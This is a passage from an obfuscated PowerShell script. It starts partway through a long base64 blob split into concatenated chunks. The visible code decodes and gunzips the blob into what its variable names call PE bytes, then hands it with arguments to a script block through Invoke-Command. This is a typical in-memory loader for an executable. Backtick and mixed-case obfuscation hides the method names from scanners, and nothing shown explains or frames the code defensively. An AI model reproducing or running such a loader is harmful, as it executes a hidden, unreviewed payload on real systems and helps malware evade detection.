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')
        ${a}  =   nO io.MeMORYsTReam(, [Convert]::"FRo`M`B`ASe64sTRinG"( ${d`ATA}) )  ;   ${B} =  nO iO.ComPREssioN.GZipSTREam(  ${A}, [IO.Compression.CoMPressionMode]::"DecO`MPR`ESS" )  ;  ${C} =  nO sYStEm.io.memORYstREAm; ${B}."CoPY`TO"(${C}  ) ; ${d}   =   [System.Text.Encoding]::"ut`F8"."GEt`sT`RING"( ${c}."Toa`RRAY"(  )) ;   ${B}."ClO`SE"(   ) ; ${a}."cl`ose"(  )  ;  ${C}."clo`SE"()
        ${PN`eBiTeS`64}   = ${D}
        ${pA`RAm1} =  ${p`Neb`itE`S64}
        ${PA`RA`m2}  =   (  'Voi'+ 'd')
        ${pA`RAM3} = 0
        ${pARA`m4}   = ""
        ${p`Ara`m5} = ${comMa`N`daRg`UmEnts}

Invoke-Command -ScriptBlock ${r`SblK} -ArgumentList ${P`ARa`M1}, ${P`ARa`m2}, ${P`AR`AM3}, ${PA`R`Am4}, ${Pa`Ra`M5}

    }

    Main
}